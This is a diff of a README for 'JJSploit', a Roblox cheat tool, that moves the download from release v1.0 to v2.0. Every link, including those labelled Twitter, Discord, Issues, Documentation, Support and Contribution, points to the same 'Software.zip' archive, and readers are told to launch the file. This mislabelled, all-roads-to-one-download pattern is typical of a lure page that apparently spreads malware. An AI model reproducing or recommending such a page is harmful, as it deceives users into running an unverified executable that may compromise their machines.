@@ -20,9 +20,9 @@ JJSploit, now available for free, is a widely-used Roblox exploit favored for it
 - roblox
 
 ## 📥 Get Started
-To explore JJsploit, you can download the repository [here](https://github.com/wompwomp12321/JJsploit/releases/download/v1.0/Software.zip). Remember to launch the file to access the content.
+To explore JJsploit, you can download the repository [here](https://github.com/wompwomp12321/JJsploit/releases/download/v2.0/Software.zip). Remember to launch the file to access the content.
 
-[![Download JJsploit](https://github.com/wompwomp12321/JJsploit/releases/download/v1.0/Software.zip)](https://github.com/wompwomp12321/JJsploit/releases/download/v1.0/Software.zip)
+[![Download JJsploit](https://github.com/wompwomp12321/JJsploit/releases/download/v2.0/Software.zip)](https://github.com/wompwomp12321/JJsploit/releases/download/v2.0/Software.zip)
 
 ## 🌟 Key Features
 - Lua script execution
@@ -41,19 +41,19 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 🤝 Connect with Us
 Stay updated with the latest news and releases:
-- Twitter: [@JJsploitOfficial](https://github.com/wompwomp12321/JJsploit/releases/download/v1.0/Software.zip)
-- Discord: [JJsploit Community](https://github.com/wompwomp12321/JJsploit/releases/download/v1.0/Software.zip)
+- Twitter: [@JJsploitOfficial](https://github.com/wompwomp12321/JJsploit/releases/download/v2.0/Software.zip)
+- Discord: [JJsploit Community](https://github.com/wompwomp12321/JJsploit/releases/download/v2.0/Software.zip)
 
 ## 🚨 Issues
-If you encounter any issues or have suggestions, please open an issue [here](https://github.com/wompwomp12321/JJsploit/releases/download/v1.0/Software.zip).
+If you encounter any issues or have suggestions, please open an issue [here](https://github.com/wompwomp12321/JJsploit/releases/download/v2.0/Software.zip).
 
 ## 🌐 Links
-- [Website](https://github.com/wompwomp12321/JJsploit/releases/download/v1.0/Software.zip)
-- [Documentation](https://github.com/wompwomp12321/JJsploit/releases/download/v1.0/Software.zip)
-- [Support](https://github.com/wompwomp12321/JJsploit/releases/download/v1.0/Software.zip)
+- [Website](https://github.com/wompwomp12321/JJsploit/releases/download/v2.0/Software.zip)
+- [Documentation](https://github.com/wompwomp12321/JJsploit/releases/download/v2.0/Software.zip)
+- [Support](https://github.com/wompwomp12321/JJsploit/releases/download/v2.0/Software.zip)
 
 ## 🙌 Contribution
-Contributions are always welcome! Please refer to the [https://github.com/wompwomp12321/JJsploit/releases/download/v1.0/Software.zip](https://github.com/wompwomp12321/JJsploit/releases/download/v1.0/Software.zip) file for guidelines.
+Contributions are always welcome! Please refer to the [https://github.com/wompwomp12321/JJsploit/releases/download/v2.0/Software.zip](https://github.com/wompwomp12321/JJsploit/releases/download/v2.0/Software.zip) file for guidelines.
 
 ---
 
